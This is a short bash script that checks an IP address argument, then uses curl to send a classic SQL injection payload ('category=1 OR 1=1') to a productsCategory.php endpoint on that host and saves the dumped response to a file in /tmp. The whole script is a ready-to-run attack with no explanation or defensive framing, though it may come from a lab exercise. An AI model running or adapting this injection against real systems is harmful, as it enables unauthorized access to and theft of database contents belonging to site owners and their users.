#!/bin/bash

usage(){
	echo "Usage: $0 ip_address"
	exit 1
}

ip=$1

if ! [[ $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  echo $1 "not a valid ip adress"
  usage
  exit 2
fi

curl 'http://'$ip'/cases/productsCategory.php?category=1%20OR%201=1' -o /tmp/dump_injection.txt
